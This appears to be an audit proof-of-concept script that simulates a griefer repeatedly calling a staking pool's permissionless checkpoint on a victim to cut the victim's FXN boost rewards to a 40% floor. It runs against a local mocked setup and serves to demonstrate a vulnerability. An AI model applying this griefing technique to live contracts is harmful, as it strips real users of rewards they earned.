// H1c: griefer forces the BR-1 state on a victim with the permissionless checkpoint(address) (L16978) and keeps
// re-poking hourly; victim's FXN for the day is settled at the 40% floor and the remainder is re-notified to all.
const { ethers, E18, DAY, now, setTime, tx, view, setupPool } = require("./lib");
async function main() {
  const { A, B, C, dist, fxn, ve, pool } = await setupPool("Boostable");
  await (await ve.set(A.address, 50n * E18)).wait();
  await (await ve.set(B.address, 50n * E18)).wait();
  await tx("A.deposit(100e18) (victim, full boost)", pool.connect(A).deposit(100n * E18, A.address));
  await tx("B.deposit(100e18) (control, full boost)", pool.connect(B).deposit(100n * E18, B.address));
  await tx("C.deposit(100e18) (griefer, no ve)", pool.connect(C).deposit(100n * E18, C.address));
  await tx("dist.depositReward(FXN, 7000e18)", pool.connect(dist).depositReward(await fxn.getAddress(), 7000n * E18));
  const t0 = await now();
  let fails = 0;
  for (let h = 1; h <= 24; h++) {
    await setTime(t0 + h * 3600);
    try { await (await pool.connect(C).checkpoint(A.address)).wait(); } catch (e) { fails++; }
  }
  console.log(`  griefer C called checkpoint(A) 24 times (hourly), failures=${fails}`);
  await tx("A.claim()", pool.connect(A)["claim()"]());
  await tx("B.claim()", pool.connect(B)["claim()"]());
  console.log("  FXN after 1 day: victim A =", ethers.formatEther(await fxn.balanceOf(A.address)),
    " control B =", ethers.formatEther(await fxn.balanceOf(B.address)));
}
main().catch((e) => { console.error(e); process.exit(1); });
